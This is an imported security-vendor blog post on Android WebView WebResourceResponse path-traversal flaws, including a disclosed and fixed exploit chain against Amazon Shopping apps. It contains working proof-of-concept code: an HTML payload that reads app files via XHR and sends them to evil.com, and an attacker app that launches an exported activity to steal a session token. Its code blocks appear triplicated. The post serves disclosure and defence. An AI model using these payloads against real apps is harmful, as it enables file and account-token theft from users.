---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-06-03_android-exploring-vulnerabilities-in-webresourceresponse.md
original_filename: 2021-06-03_android-exploring-vulnerabilities-in-webresourceresponse.md
title: 'Android: Exploring vulnerabilities in WebResourceResponse'
category: documents
detected_topics:
- mobile-security
- cors
- xss
- command-injection
- path-traversal
- otp
tags:
- imported
- documents
- mobile-security
- cors
- xss
- command-injection
- path-traversal
- otp
language: en
raw_sha256: 9de95ed7957d188310361264050036cde1cd18fe5f7e9ba37a10af0e29cd67c2
text_sha256: 47091c28f8b5de9fb19db92d876a0039df6bc05b308caab8d0980af61cdef819
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# Android: Exploring vulnerabilities in WebResourceResponse

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-06-03_android-exploring-vulnerabilities-in-webresourceresponse.md
- Source Type: markdown
- Detected Topics: mobile-security, cors, xss, command-injection, path-traversal, otp
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `9de95ed7957d188310361264050036cde1cd18fe5f7e9ba37a10af0e29cd67c2`
- Text SHA256: `47091c28f8b5de9fb19db92d876a0039df6bc05b308caab8d0980af61cdef819`


## Content

---
title: "Android: Exploring vulnerabilities in WebResourceResponse"
page_title: "Android: Exploring vulnerabilities in WebResourceResponse | Oversecured Blog"
url: "https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/"
final_url: "https://oversecured.com/blog/android-exploring-vulnerabilities-in-webresourceresponse"
authors: ["Oversecured (@OversecuredInc)"]
programs: ["Amazon"]
bugs: ["Arbitrary file read", "Android"]
publication_date: "2021-06-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3601
---

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

Dast is live! 

[Learn more →](../dast)

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

[](../)

[BLOG](../blog)

[Case studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

solutions

[Sign in](https://app.oversecured.com/sign-in)

Contact us

[](../)

[](../)

No headings found on page

May 3, 2021

Android Security

###### Android: Exploring vulnerabilities in WebResourceResponse

###### Android: Exploring vulnerabilities in WebResourceResponse

![](https://framerusercontent.com/images/8NkEVHu0tzIJRK5hYVVHevEBY.png?width=2048&height=1194)

When it comes to vulnerabilities in WebViews, we often overlook the incorrect implementation of `WebResourceResponse` which is a WebView class that allows an Android app to emulate the server by returning a response (including a status code, content type, content encoding, headers and the response body) from the app’s code itself without making any actual requests to the server. At the end of the article, we’ll show how we exploited a vulnerability related to this in Amazon apps.

Do you want to check your mobile apps for such types of vulnerabilities? Oversecured mobile apps scanner provides an automatic solution that helps to detect vulnerabilities in Android and iOS mobile apps. You can integrate Oversecured into your development process and check every new line of your code to ensure your users are always protected.

Start securing your apps by starting a free 2-week trial from [Quick Start](https://app.oversecured.com/docs/quick-start/), or you can [book a call](https://calendly.com/oversecured/30min) with our team or [contact us](https://app.oversecured.com/contact-us) to explore more.

## What is `WebResourceResponse`?

The WebView class in Android is used for displaying web content within an app, and provides extensive capabilities for manipulating requests and responses. It is a fancy web browser that allows developers, among other things, to bypass standard browser security. Any misuse of these features by a malicious actor can lead to vulnerabilities in mobile apps.

One of these features is that a WebView allows you to intercept app requests and return arbitrary content, which is implemented via the `WebResourceResponse` class.

Let’s look at a typical example of a `WebResourceResponse`implementation:
  
  
  WebView webView = findViewById(R.id.webView);
  webView.setWebViewClient(new WebViewClient() {
  public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
  Uri uri = request.getUrl();
  if (uri.getPath().startsWith("/local_cache/")) {
  File cacheFile = new File(getCacheDir(), uri.getLastPathSegment());
  if (cacheFile.exists()) {
  InputStream inputStream;
  try {
  inputStream = new FileInputStream(cacheFile);
  } catch (IOException e) {
  return null;
  }
  Map<String, String> headers = new HashMap<>();
  headers.put("Access-Control-Allow-Origin", "*");
  return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream);
  }
  }
  return super.shouldInterceptRequest(view, request);
  }
  });
  
  
  WebView webView = findViewById(R.id.webView);
  webView.setWebViewClient(new WebViewClient() {
  public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
  Uri uri = request.getUrl();
  if (uri.getPath().startsWith("/local_cache/")) {
  File cacheFile = new File(getCacheDir(), uri.getLastPathSegment());
  if (cacheFile.exists()) {
  InputStream inputStream;
  try {
  inputStream = new FileInputStream(cacheFile);
  } catch (IOException e) {
  return null;
  }
  Map<String, String> headers = new HashMap<>();
  headers.put("Access-Control-Allow-Origin", "*");
  return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream);
  }
  }
  return super.shouldInterceptRequest(view, request);
  }
  });
  
  
  WebView webView = findViewById(R.id.webView);
  webView.setWebViewClient(new WebViewClient() {
  public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
  Uri uri = request.getUrl();
  if (uri.getPath().startsWith("/local_cache/")) {
  File cacheFile = new File(getCacheDir(), uri.getLastPathSegment());
  if (cacheFile.exists()) {
  InputStream inputStream;
  try {
  inputStream = new FileInputStream(cacheFile);
  } catch (IOException e) {
  return null;
  }
  Map<String, String> headers = new HashMap<>();
  headers.put("Access-Control-Allow-Origin", "*");
  return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream);
  }
  }
  return super.shouldInterceptRequest(view, request);
  }
  });

As you can see in the code above, if the request URI matches a given pattern, then the response is returned from the app resources or local files. The problem arises when an attacker can manipulate the path of the returned file and, through XHR requests, gain access to arbitrary files.

Therefore, if an attacker discovers a simple XSS or the ability to open arbitrary links inside the Android app, they can use that to leak sensitive user data – which can also include the access token, leading to a full account takeover.

### Proof of Concept for an attack

If you already have the ability to execute arbitrary JavaScript code inside a vulnerable WebView, and assuming there is some sensitive data in `/data/data/com.victim/shared_prefs/auth.xml`, then the Proof of Concept for the attack will look like this:
  
  
  <!DOCTYPE html>
  <html>
  <head>
  <title>Evil page</title>
  </head>
  <body>
  <script type="text/javascript">
  function theftFile(path, callback) {
  var oReq = new XMLHttpRequest();
  
  oReq.open(
  'GET',
  'https://any.domain/local_cache/..%2F' + encodeURIComponent(path),
  true
  );
  oReq.onload = function (e) {
  callback(oReq.responseText);
  };
  oReq.onerror = function (e) {
  callback(null);
  };
  oReq.send();
  }
  
  theftFile('shared_prefs/auth.xml', function (contents) {
  location.href =
  'https://evil.com/?data=' + encodeURIComponent(contents);
  });
  </script>
  </body>
  </html>
  
  
  <!DOCTYPE html>
  <html>
  <head>
  <title>Evil page</title>
  </head>
  <body>
  <script type="text/javascript">
  function theftFile(path, callback) {
  var oReq = new XMLHttpRequest();
  
  oReq.open(
  'GET',
  'https://any.domain/local_cache/..%2F' + encodeURIComponent(path),
  true
  );
  oReq.onload = function (e) {
  callback(oReq.responseText);
  };
  oReq.onerror = function (e) {
  callback(null);
  };
  oReq.send();
  }
  
  theftFile('shared_prefs/auth.xml', function (contents) {
  location.href =
  'https://evil.com/?data=' + encodeURIComponent(contents);
  });
  </script>
  </body>
  </html>
  
  
  <!DOCTYPE html>
  <html>
  <head>
  <title>Evil page</title>
  </head>
  <body>
  <script type="text/javascript">
  function theftFile(path, callback) {
  var oReq = new XMLHttpRequest();
  
  oReq.open(
  'GET',
  'https://any.domain/local_cache/..%2F' + encodeURIComponent(path),
  true
  );
  oReq.onload = function (e) {
  callback(oReq.responseText);
  };
  oReq.onerror = function (e) {
  callback(null);
  };
  oReq.send();
  }
  
  theftFile('shared_prefs/auth.xml', function (contents) {
  location.href =
  'https://evil.com/?data=' + encodeURIComponent(contents);
  });
  </script>
  </body>
  </html>

It should be noted that the attack works because `new File(getCacheDir(), uri.getLastPathSegment())` is being used to generate the path and the method `Uri.getLastPathSegment()` returns a decoded value.

However, policies like CORS still work inside a WebView. Therefore, if `Access-Control-Allow-Origin: *` is not specified in the headers, then requests to the current domain will not be allowed. In our example, this restriction will not affect the exploitation of path traversal, because `any.domain` can be replaced with the current scheme + host + port.

## An overview of the vulnerability in Amazon’s apps

We scanned the Amazon Shopping and Amazon India Online Shopping apps and found two vulnerabilities. They were chained to access arbitrary files owned by Amazon apps and then reported to the Amazon VRP on December 21st, 2019. The issues were confirmed fixed by Amazon on April 6th, 2020.

The first was opening arbitrary URLs within the WebView through the `com.amazon.mShop.pushnotification.WebNotificationsSettingsActivity`activity:

![](https://framerusercontent.com/images/zuWfGWnHqr01n8mMPfMQYLeRiM.png?width=2248&height=19922)

– and the second was stealing arbitrary files via `WebResourceResponse`in the `com/amazon/mobile/mash/MASHWebViewClient.java` file:

![](https://framerusercontent.com/images/Rp6kJbQZ4siiPMfbSpWhX23xkf8.png?width=2252&height=5598)

Two checks take place in the `com/amazon/mobile/mash/handlers/LocalAssetHandler.java` file:

One is in the `shouldHandlePackage` method:
  
  
  public boolean shouldHandlePackage(UrlWebviewPackage pkg) {
  return pkg.getUrl().startsWith("https://app.local/");
  }
  
  
  public boolean shouldHandlePackage(UrlWebviewPackage pkg) {
  return pkg.getUrl().startsWith("https://app.local/");
  }
  
  
  public boolean shouldHandlePackage(UrlWebviewPackage pkg) {
  return pkg.getUrl().startsWith("https://app.local/");
  }

And the second is in the `handlePackage` handler:
  
  
  public WebResourceResponse handlePackage(UrlWebviewPackage pkg) {
  InputStream stm;
  Uri uri = Uri.parse(pkg.getUrl());
  String path = uri.getPath().substring(1);
  try {
  if (path.startsWith("assets/")) {
  stm = pkg.getWebView().getContext().getResources().getAssets().open(path.substring("assets/".length()));
  } else if (path.startsWith("files/")) {
  stm = new FileInputStream(path.substring("files/".length())); // path to an arbitrary file
  } else {
  MASHLog.m2345v(TAG, "Unexpected path " + path);
  stm = null;
  }
  //...
  Map<String, String> headers = new HashMap<>();
  headers.put("Cache-Control", "max-age=31556926");
  headers.put("Access-Control-Allow-Origin", "*");
  return new WebResourceResponse(mimeType, null, 200, "OK", headers, stm);
  } catch (IOException e) {
  MASHLog.m2346v(TAG, "Failed to load resource " + uri, e);
  return null;
  }
  }
  
  
  public WebResourceResponse handlePackage(UrlWebviewPackage pkg) {
  InputStream stm;
  Uri uri = Uri.parse(pkg.getUrl());
  String path = uri.getPath().substring(1);
  try {
  if (path.startsWith("assets/")) {
  stm = pkg.getWebView().getContext().getResources().getAssets().open(path.substring("assets/".length()));
  } else if (path.startsWith("files/")) {
  stm = new FileInputStream(path.substring("files/".length())); // path to an arbitrary file
  } else {
  MASHLog.m2345v(TAG, "Unexpected path " + path);
  stm = null;
  }
  //...
  Map<String, String> headers = new HashMap<>();
  headers.put("Cache-Control", "max-age=31556926");
  headers.put("Access-Control-Allow-Origin", "*");
  return new WebResourceResponse(mimeType, null, 200, "OK", headers, stm);
  } catch (IOException e) {
  MASHLog.m2346v(TAG, "Failed to load resource " + uri, e);
  return null;
  }
  }
  
  
  public WebResourceResponse handlePackage(UrlWebviewPackage pkg) {
  InputStream stm;
  Uri uri = Uri.parse(pkg.getUrl());
  String path = uri.getPath().substring(1);
  try {
  if (path.startsWith("assets/")) {
  stm = pkg.getWebView().getContext().getResources().getAssets().open(path.substring("assets/".length()));
  } else if (path.startsWith("files/")) {
  stm = new FileInputStream(path.substring("files/".length())); // path to an arbitrary file
  } else {
  MASHLog.m2345v(TAG, "Unexpected path " + path);
  stm = null;
  }
  //...
  Map<String, String> headers = new HashMap<>();
  headers.put("Cache-Control", "max-age=31556926");
  headers.put("Access-Control-Allow-Origin", "*");
  return new WebResourceResponse(mimeType, null, 200, "OK", headers, stm);
  } catch (IOException e) {
  MASHLog.m2346v(TAG, "Failed to load resource " + uri, e);
  return null;
  }
  }

### Proof of Concept for Amazon

Keeping the above-mentioned vulnerabilities and checks in mind, the attacker’s app looked like this:
  
  
  String file = "/sdcard/evil.html";
  try (InputStream inputStream = getAssets().open("evil.html")) {
  try (OutputStream outputStream = new FileOutputStream(file)) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  
  Intent intent = new Intent();
  intent.setClassName("in.amazon.mShop.android.shopping", "com.amazon.mShop.pushnotification.WebNotificationsSettingsActivity");
  intent.putExtra("MASHWEBVIEW_URL", "file://www.amazon.in" + file + "#/data/data/in.amazon.mShop.android.shopping/shared_prefs/DataStore.xml");
  startActivity(intent);
  
  
  String file = "/sdcard/evil.html";
  try (InputStream inputStream = getAssets().open("evil.html")) {
  try (OutputStream outputStream = new FileOutputStream(file)) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  
  Intent intent = new Intent();
  intent.setClassName("in.amazon.mShop.android.shopping", "com.amazon.mShop.pushnotification.WebNotificationsSettingsActivity");
  intent.putExtra("MASHWEBVIEW_URL", "file://www.amazon.in" + file + "#/data/data/in.amazon.mShop.android.shopping/shared_prefs/DataStore.xml");
  startActivity(intent);
  
  
  String file = "/sdcard/evil.html";
  try (InputStream inputStream = getAssets().open("evil.html")) {
  try (OutputStream outputStream = new FileOutputStream(file)) {
  IOUtils.copy(inputStream, outputStream);
  }
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  
  Intent intent = new Intent();
  intent.setClassName("in.amazon.mShop.android.shopping", "com.amazon.mShop.pushnotification.WebNotificationsSettingsActivity");
  intent.putExtra("MASHWEBVIEW_URL", "file://www.amazon.in" + file + "#/data/data/in.amazon.mShop.android.shopping/shared_prefs/DataStore.xml");
  startActivity(intent);

The apps also had a host check that was bypassed by us. This check could also be bypassed using the `javascript:` scheme which removed any requirements to have SD card permissions for making a file.

The file `evil.html` contained the exploit code:
  
  
  <!DOCTYPE html>
  <html>
  <head>
  <title>Evil</title>
  </head>
  <body>
  <script type="text/javascript">
  function theftFile(path, callback) {
  var oReq = new XMLHttpRequest();
  
  oReq.open('GET', 'https://app.local/files/' + path, true);
  oReq.onload = function (e) {
  callback(oReq.responseText);
  };
  oReq.onerror = function (e) {
  callback(null);
  };
  oReq.send();
  }
  
  theftFile(location.hash.substring(1), function (contents) {
  location.href =
  'https://evil.com/?data=' + encodeURIComponent(contents);
  });
  </script>
  </body>
  </html>
  
  
  <!DOCTYPE html>
  <html>
  <head>
  <title>Evil</title>
  </head>
  <body>
  <script type="text/javascript">
  function theftFile(path, callback) {
  var oReq = new XMLHttpRequest();
  
  oReq.open('GET', 'https://app.local/files/' + path, true);
  oReq.onload = function (e) {
  callback(oReq.responseText);
  };
  oReq.onerror = function (e) {
  callback(null);
  };
  oReq.send();
  }
  
  theftFile(location.hash.substring(1), function (contents) {
  location.href =
  'https://evil.com/?data=' + encodeURIComponent(contents);
  });
  </script>
  </body>
  </html>
  
  
  <!DOCTYPE html>
  <html>
  <head>
  <title>Evil</title>
  </head>
  <body>
  <script type="text/javascript">
  function theftFile(path, callback) {
  var oReq = new XMLHttpRequest();
  
  oReq.open('GET', 'https://app.local/files/' + path, true);
  oReq.onload = function (e) {
  callback(oReq.responseText);
  };
  oReq.onerror = function (e) {
  callback(null);
  };
  oReq.send();
  }
  
  theftFile(location.hash.substring(1), function (contents) {
  location.href =
  'https://evil.com/?data=' + encodeURIComponent(contents);
  });
  </script>
  </body>
  </html>

As a result, on opening the attacker’s app, the `DataStore.xml` file containing the user’s session token was sent to the attacker’s server.

## How to prevent this vulnerability

While implementing `WebResourceResponse`, it is recommended to use `[WebViewAssetLoader](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader)`, which is a user-friendly interface. It allows the app to safely process data from resources, assets or a predefined directory.

##### Keep reading

[View all](../blog)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/3pdKQL7LiXMgBBDS1jzcalJrMnA.png?width=2048&height=1194)Android security checklist: theft of arbitrary filesDevelopers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. Android SecurityMay 20, 202211min readTOp article](./android-security-checklist-theft-of-arbitrary-files)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./android-exploring-vulnerabilities-in-webresourceresponse#header)

[](../)

[go up ↑](./android-exploring-vulnerabilities-in-webresourceresponse#header)

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

2026 © Oversecured

[Blog](../blog)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

[Case Studies](https://oversecured.com/blog?category=case-study)

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./android-exploring-vulnerabilities-in-webresourceresponse#header)
